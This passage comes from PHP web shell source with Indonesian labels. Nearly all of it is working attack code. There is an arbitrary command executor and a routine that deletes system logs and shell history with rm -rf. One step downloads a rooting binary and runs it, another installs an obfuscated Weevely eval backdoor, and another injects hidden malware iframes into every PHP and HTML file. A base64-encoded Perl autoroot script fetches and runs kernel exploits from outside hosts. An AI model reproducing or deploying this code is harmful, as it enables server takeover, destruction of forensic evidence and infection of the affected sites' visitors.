            if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
                if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
                    $act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        }
    }

    echo "Upload File:
    <form method='post' enctype='multipart/form-data'>
    <input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ]
    <input type='radio' name='tipe_upload' value='home_root'>Home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
    <input type='file' name='ix_file'>
    <input type='submit' value='Upload' name='upload'>
    </form>";
    echo $act;
	echo "</center><br>";
}
elseif($_GET['do'] == 'cmd') {
	echo "<center><form method='post'>
    <font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
    <input type='text' size='30' height='10' name='cmd'> <input type='submit' name='do_cmd' value='>>'>
    </form>";
    if($_POST['do_cmd']) {
        echo "<pre>".exe($_POST['cmd'])."</pre>";
        echo "</center>";
    }
}
elseif($_GET['do'] == 'delogs') {
  	echo '<center><b><span>Delete Logs ( For Safety can be fun = Supported By Fiesta :v )</span></b><br>';
    echo "<table style='margin: 0 auto;'><tr align='top'><td align='left'>";
	exec("rm -rf /tmp/logs");
	exec("rm -rf /root/.ksh_history");
	exec("rm -rf /root/.bash_history");
	exec("rm -rf /root/.bash_logout");
	exec("rm -rf /usr/local/apache/logs");
	exec("rm -rf /usr/local/apache/log");
	exec("rm -rf /var/apache/logs");
	exec("rm -rf /var/apache/log");
	exec("rm -rf /var/run/utmp");
	exec("rm -rf /var/logs");
	exec("rm -rf /var/log");
	exec("rm -rf /var/adm");
	exec("rm -rf /etc/wtmp");
	exec("rm -rf /etc/utmp");
	exec("rm -rf $HISTFILE");
	exec("rm -rf /var/log/lastlog");
	exec("rm -rf /var/log/wtmp");

	shell_exec("rm -rf /tmp/logs");
	shell_exec("rm -rf /root/.ksh_history");
	shell_exec("rm -rf /root/.bash_history");
	shell_exec("rm -rf /root/.bash_logout");
	shell_exec("rm -rf /usr/local/apache/logs");
	shell_exec("rm -rf /usr/local/apache/log");
	shell_exec("rm -rf /var/apache/logs");
	shell_exec("rm -rf /var/apache/log");
	shell_exec("rm -rf /var/run/utmp");
	shell_exec("rm -rf /var/logs");
	shell_exec("rm -rf /var/log");
	shell_exec("rm -rf /var/adm");
	shell_exec("rm -rf /etc/wtmp");
	shell_exec("rm -rf /etc/utmp");
	shell_exec("rm -rf $HISTFILE");
	shell_exec("rm -rf /var/log/lastlog");
	shell_exec("rm -rf /var/log/wtmp");

	passthru("rm -rf /tmp/logs");
	passthru("rm -rf /root/.ksh_history");
	passthru("rm -rf /root/.bash_history");
	passthru("rm -rf /root/.bash_logout");
	passthru("rm -rf /usr/local/apache/logs");
	passthru("rm -rf /usr/local/apache/log");
	passthru("rm -rf /var/apache/logs");
	passthru("rm -rf /var/apache/log");
	passthru("rm -rf /var/run/utmp");
	passthru("rm -rf /var/logs");
	passthru("rm -rf /var/log");
	passthru("rm -rf /var/adm");
	passthru("rm -rf /etc/wtmp");
	passthru("rm -rf /etc/utmp");
	passthru("rm -rf $HISTFILE");
	passthru("rm -rf /var/log/lastlog");
	passthru("rm -rf /var/log/wtmp");


	system("rm -rf /tmp/logs");
	sleep(2);
	echo'<p>Deleting .../tmp/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
	sleep(2);

	system("rm -rf /root/.bash_history");
	sleep(2);
	echo'<p>Deleting .../root/.bash_history <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /root/.ksh_history");
	sleep(2);
	echo'<p>Deleting .../root/.ksh_history <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /root/.bash_logout");
	sleep(2);
	echo'<p>Deleting .../root/.bash_logout <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /usr/local/apache/logs");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /usr/local/apache/log");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/apache/logs");
	sleep(2);
	echo'<p>Deleting .../var/apache/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/apache/log");
	sleep(2);
	echo'<p>Deleting .../var/apache/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/run/utmp");
	sleep(2);
	echo'<p>Deleting .../var/run/utmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/logs");
	sleep(2);
	echo'<p>Deleting .../var/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/log");
	sleep(2);
	echo'<p>Deleting .../var/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/adm");
	sleep(2);
	echo'<p>Deleting .../var/adm <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /etc/wtmp");
	sleep(2);
	echo'<p>Deleting .../etc/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /etc/utmp");
	sleep(2);
	echo'<p>Deleting .../etc/utmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf $HISTFILE");
	sleep(2);
	echo'<p>Deleting ...$HISTFILE <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>'; 

	system("rm -rf /var/log/lastlog");
	sleep(2);
	echo'<p>Deleting .../var/log/lastlog <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/log/wtmp");
	sleep(2);
	echo'<p>Deleting .../var/log/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	sleep(4);

	echo '<p><i>Your Traces Has Been Successfully Deleting ...From the Server</i></p><br>';
	echo '</center>';
    echo '</table></td></tr>';
}
if($_GET['do'] == 'r00t') {
echo"<center>
<form method='post'>
<h3>Just Work In Kernel -2016</h3>
Login: ( ssh azzatssins@".$ip." ) or ( su azzatssins )<br><br>
New Password: <input type='text' name='passwd' value='17081945'>
<input type=submit name=azzzt value='Root!'></form></center>";
if($_POST['azzzt']) {
exe("wget https://raw.githubusercontent.com/cyberserkers/root/master/azx && chmod +x azx && ./azx ".$_POST['passwd']);
}}
function success($for, $var1) {
    $domain = $_SERVER['HTTP_HOST'];
    $script = $_SERVER['SCRIPT_NAME'];
    $full_url = $_SERVER['REQUEST_URI'];
	if ($for == "weevely") {
        $message = "<center><font color='lime'>Weevely installed!</font></center>";
        $redirect = "";
    }
if (empty($redirect)) {
echo "<script>
function remove (){
document.getElementById('content').innerHTML='';
}
setInterval(function(){remove();}, 2700);
</script>";
} else {
	echo "<script>
function remove (){
 window.location = '$redirect'
}
setInterval(function(){remove();}, 2500);
</script>";
    }
}
function error($mesg) {
    $error = "<center><font color='red'>$mesg</font></center>";
    echo "$error";
}
if (isset($_GET['weevely'])) {
    echo "<center><h3>Weevely Backdoor</h3>
<form action='' method='post'>
Directory to install weevely backdoor:<br>
<input type='text' name='weev_dir' size='50' class='text' value='$dir'><br>
Name of file (something .php):<br>
<input type='text' name='weev_name' class='text' value='weevely.php'><br>
Password (more than 3 characters):<br>
<input type='text' name='weev_pass' class='text'><br>
<input type='submit' name='install_weev' value='Backdoor!'><br>
</font>
</center>";
}
if (isset($_POST['install_weev'])) {
    $weevdir = rtrim($_POST['weev_dir'], '/');;
    $weevname = $_POST['weev_name'];
    $weevpassword = $_POST['weev_pass'];
    if (strlen($weevpassword) < 3) {
        error("Password must be longer than 3 characters!");
    } else {
        $first2 = $weevpassword[0] . $weevpassword[1];
        $rest = substr($weevpassword, 2);
        $money = "$";
        $weevelybd1 = base64_decode('ZnVuY3Rpb24gd2VldmVseSgpIHsNCiRjPSdjb3VudCc7DQokYT0kX0NPT0tJRTs=');
        $weevelybd2 = "if(reset($money" . "a)=='" . $first2 . "' && $money" . "c($money" . "a)>3) {";
        $weevelybd3 = "$money" . "k='$rest';";
        $weevelybd4 = base64_decode('ZWNobyAnPCcuJGsuJz4nOw0KZXZhbChiYXNlNjRfZGVjb2RlKHByZWdfcmVwbGFjZShhcnJheSgnL1teXHc9XHNdLycsJy9ccy8nKSwgYXJyYXkoJycsJysnKSwgam9pbihhcnJheV9zbGljZSgkYSwkYygkYSktMykpKSkpOw0KZWNobyAnPC8nLiRrLic+JzsNCn0NCn0NCndlZXZlbHkoKTs=');
        $all = "<?php eval(base64_decode('" . base64_encode($weevelybd1 . $weevelybd2 . $weevelybd3 . $weevelybd4) . "')); ?>";
        if (file_put_contents($weevdir . '/' . $weevname, $all)) {
            echo "<center><font color='lime'>Weevely installed!<br><br>Usage: weevely [URL of backdoor] [password]</font></center>";
            success("weevely");
        } else {
            error("Failed to write backdoor to $weevdir");
        }
    }
}
elseif($_GET['do'] == 'malware')
    { 
@ini_set('output_buffering', 0); {
?>
<form action="" method="post">
    <center>
<h3>Malware Tools</h3>
<font color="red">Private Network / Dial Up Modem ,PC Private , ato Home PC / NETWORK</font>&nbsp;(Ojo digawe goblok!!)<br><br>
    <input class='kotak' type='submit' name='redirect' value="Redirect Search Engine To Malware Site" /></td><td>
    <input type='submit' class='kotak' name='infect' value="Infect User" /></td><tr></table>
        <input type='submit' name='code' class='kotak' value="Code Insert" /></td><tr></table>
</center><br>

<?php
        if (isset($_POST['redirect'])) if ($myfile = fopen(".htaccess", 'a')) {
            fwrite($myfile, gzuncompress(base64_decode($mal)));
            fwrite($myfile, "

");
            fclose($myfile);
            ob_end_flush();
        } else echo "<script>alert('Malware Ga ke kirim Jancookk'); hideAll();</script>";
    }   if (isset($_POST['infect'])) {
        $coun = 0;
        $str = "<iframe width=0px height=0px frameborder=no name=frame1 src=" . $malsite . "> </iframe>";
        foreach (glob($_GET['dir'] . $directorysperator . "*.php") as $injectj00) {
            if ($myfile = fopen($injectj00, 'a')) {
                fputs($myfile, $str);
                fclose($myfile);
            } else $coun = 1;
        }
        foreach (glob($_GET['dir'] . $directorysperator . "*.htm") as $injectj00) {
            if ($myfile = fopen($injectj00, 'a')) {
                fputs($myfile, $str);
                fclose($myfile);
            } else $coun = 1;
        }
        foreach (glob($_GET['dir'] . $directorysperator . "*.html") as $injectj00) {
            if ($myfile = fopen($injectj00, 'a')) {
                fputs($myfile, $str);
                fclose($myfile);
            } else $coun = 1;
        }
        if ($coun == 0) echo "<script>alert('Malware Infect In user ... DONE...!!!!'); hideAll();</script>";
        else echo "<script>alert('Malware Ga ke kirim Jancookk'); hideAll();</script>";
    }
    if (!isset($_POST['code'])) {
        if ($file1 = fopen(".htaccess", 'r')) {
        } else echo "<script>alert('Malware Ga ke kirim Jancookk'); hideAll();</script>";
    } else {
        if ($myfile = fopen(".htaccess", 'a')) {
            fwrite($myfile, $_POST['code']);
            fwrite($myfile, "

");
            fclose($myfile);
            ob_end_flush();
        } else echo "Permission Denied";
    }
}
elseif($_GET['do'] == 'base64pict') {
  /*
  ** Convert Gambar ke Base64
  ** Coded By Mr.xBarakuda
  */
  function imageBase64FromURL($url){
  $urlParts = pathinfo($url);
  $extension = $urlParts['extension'];
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  $response = curl_exec($ch);
  curl_close($ch);
  $base64 = 'data:image/'.$extension.';base64,'.base64_encode($response);
  return $base64;
  }
  echo '
  <center>
    <h3>Base64 Encode Gambar</h3>
    <p style="color:red;">Coded By Mr.xBarakuda</p>
    <form method="post">
      URL Gambar: </font>
      <input type="text" name="urlGambar" size="50" height="10" placeholder="http://kudagans.go.id/gue_gans.jpg" style="margin: 5px auto; padding-right: 5px;" required>
      <input type="submit" name="encode" value="Encode">
    </form>
    ';
    $urlGambar = $_POST['urlGambar'];
    $encode = $_POST['encode'];
    $encodeGambar = imageBase64FromURL($urlGambar);
    echo "
    <textarea cols='100' rows='23'>".$encodeGambar."</textarea>
    ";
    echo "
    <br>
  </center>";
  }
elseif($_GET['do'] == 'w00t'){
print'<center>';
print'<h3>Autoroot Generator Coded By Mauritania Attacker</h3>';
print'<b>Special Greet To HusseiN98D</b><br>';
print'<b>2005 - 2013</b>';
print"<p align='center'><img border='0' src='http://www.spirit-of-metal.com/les%20goupes/R/Root/pics/logo.jpg'></p>";
@error_reporting(0);
sleep(2);
print "<p><b>Script Autoroot Perl Extracted Successfully...!</b></p><br>";
//generate autoroot script perl
mkdir('kuda_root',0755);
$shellw0rm = 'cHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0KcHJpbnQgIiAgICAgICAgIEFub25HaG9zdCBTbTRzaCBhdXRvIHIwMHQgICAgICAgICAgXG4iOw0KcHJpbnQgIiAgICAgICAgICAgICAgICAgMjAwNSAtIDIwMTMgICAgICAgICAgICAgICAgXG4iOw0KcHJpbnQgIiAgICAgX19fX19fXyAgX19fX19fXyAgX19fX19fXyBfX19fX19fX18gICAgXG4iOw0KcHJpbnQgIiAgICAoICBfX19fICkoICBfXyAgICkoICBfXyAgIClcX18gICBfXy8gICAgXG4iOw0KcHJpbnQgIiAgICB8ICggICAgKXx8ICggICkgIHx8ICggICkgIHwgICApICggICAgICAgXG4iOw0KcHJpbnQgIiAgICB8IChfX19fKXx8IHwgLyAgIHx8IHwgLyAgIHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8ICAgICBfXyl8ICgvIC8pIHx8ICgvIC8pIHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8IChcICggICB8ICAgLyB8IHx8ICAgLyB8IHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8ICkgXCBcX198ICAoX18pIHx8ICAoX18pIHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8LyAgIFxfXy8oX19fX19fXykoX19fX19fXykgICApXyggICAgICAgXG4iOw0KcHJpbnQgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJCSAgIENvZGVkIGJ5IEh1c3NlaU45OEQgICAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJCQkgICAgIDE5LzA4LzIwMTQJCSAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJICBUbyByb290IGxpbnV4ICwgcGVybCAkMCBsbnggICAgICAgICAgXG4iOw0KcHJpbnQgIgkJICBUbyByb290IEJzZCAsICBwZXJsICQwIGJzZCAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJICBUbyByb290IFN1bk9TICwgcGVybCAkMCBzdW5vcyAgICAgICAgXG4iOw0KcHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0KDQoNCmlmICgkQVJHVlswXSA9fiAibG54IiApDQp7DQpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsNCnByaW50ICIjIExpbnV4L0JzZC9TdW5vcyBBVVRPLVJPT1RFUiAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICBIYXZlIGEgY29mZmUgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgIFJvb3RpbmcgbGludXggICAgICAgICAgI1xuIjsNCnByaW50ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0Kc3lzdGVtKCJ1bmFtZSAtYTtta2RpciBsbng7Y2QgbG54Iik7DQpwcmludCAiWytdIFdhaXQuLlxuIjsNCg0Kc3lzdGVtKCJ3Z2V0IHd3dy50dXgtcGxhbmV0LmZyL3B1YmxpYy9oYWNrL2V4cGxvaXRzL2tlcm5lbC9sb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zLmMiKTsNCnN5c3RlbSgiZ2NjIC1vIGdheXJvcyBsb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zLmMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGdheXJvcyIpOw0Kc3lzdGVtKCIuL2dheXJvcyIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgd3d3LnR1eC1wbGFuZXQuZnIvcHVibGljL2hhY2svZXhwbG9pdHMva2VybmVsL3Ztc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdC5jIik7DQpzeXN0ZW0oImdjYyAtbyB2bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQgdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0LmMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHZtc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdCIpOw0Kc3lzdGVtKCIuL3Ztc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdCIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290LzIuNi54L3gyIik7DQpzeXN0ZW0oImNobW9kIDc3NyB4MiIpOw0Kc3lzdGVtKCIuL3gyIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngveCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgeCIpOw0Kc3lzdGVtKCIuL3giKTsNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvdXNlbGliMjQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHVzZWxpYjI0Iik7DQpzeXN0ZW0oIi4vdXNlbGliMjQiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC9yb290MiIpOw0Kc3lzdGVtKCJjaG1vZCA3Nzcgcm9vdDIiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCIuL3Jvb3QyIik7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290LzIuNi54L2ttb2QyIik7DQpzeXN0ZW0oImNobW9kIDc3NyBrbW9kMiIpOw0Kc3lzdGVtKCIuL2ttb2QyIik7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290LzIuNi54L2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgaDAwbHlzaGl0Iik7DQpzeXN0ZW0oIi4vaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvZXhwLnNoIik7DQpzeXN0ZW0oImNobW9kIDc1NSBleHAuc2giKTsNCnN5c3RlbSgic2ggZXhwLnNoIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvZWxmbGJsIik7DQpzeXN0ZW0oImNobW9kIDc3NyBlbGZsYmwiKTsNCnN5c3RlbSgiLi9lbGZsYmwiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC9jdzcuMyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgY3c3LjMiKTsNCnN5c3RlbSgiLi9jdzcuMyIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtMzc0LjEyLjEuZWw1LTIwMTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0zNzQuMTIuMS5lbDUtMjAxMiIpOw0Kc3lzdGVtKCIuLzIuNi4xOC0zNzQuMTIuMS5lbDUtMjAxMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC0yNzQtMjAxMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTI3NC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTI3NC0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtNi14ODYtMjAxMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTYteDg2LTIwMTEiKTsNCnN5c3RlbSgiLi8yLjYuMTgtNi14ODYtMjAxMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3Qvdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyB2bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQiKTsNCnN5c3RlbSgiLi92bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIwMTEgTG9jYWxSb290IEZvciAyLjYuMTgtMTI4LmVsNSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAxMSBMb2NhbFJvb3QgRm9yIDIuNi4xOC0xMjguZWw1Iik7DQpzeXN0ZW0oIi4vMjAxMSBMb2NhbFJvb3QgRm9yIDIuNi4xOC0xMjguZWw1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zMyIpOw0Kc3lzdGVtKCIuLzIuNi4zMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjMzLTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zNC0yMDExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzQtMjAxMSIpOw0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzQtMjAxMUV4cGxvaXQxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzQtMjAxMUV4cGxvaXQxIik7DQpzeXN0ZW0oIi4vMi42LjM0LTIwMTFFeHBsb2l0MSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExRXhwbG9pdDIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM3Iik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zNy1yYzIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zNy1yYzIiKTsNCnN5c3RlbSgiLi8yLjYuMzctcmMyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC96MWQtMjAxMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgejFkLTIwMTEiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMjAxMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMS0yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxLTIiKTsNCnN5c3RlbSgiLi8xLTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEtMyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMS0zIik7DQpzeXN0ZW0oIi4vMS0zIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xLTQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDEtNCIpOw0Kc3lzdGVtKCIuLzEtNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDEwIik7DQpzeXN0ZW0oIi4vMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxMSIpOw0Kc3lzdGVtKCIuLzExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xMiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMTIiKTsNCnN5c3RlbSgiLi8xMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE0Iik7DQpzeXN0ZW0oIi4vMTQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE1LnNoIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNS5zaCIpOw0Kc3lzdGVtKCIuLzE1LnNoIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xNTE1MCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMTUxNTAiKTsNCnN5c3RlbSgiLi8xNTE1MCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ld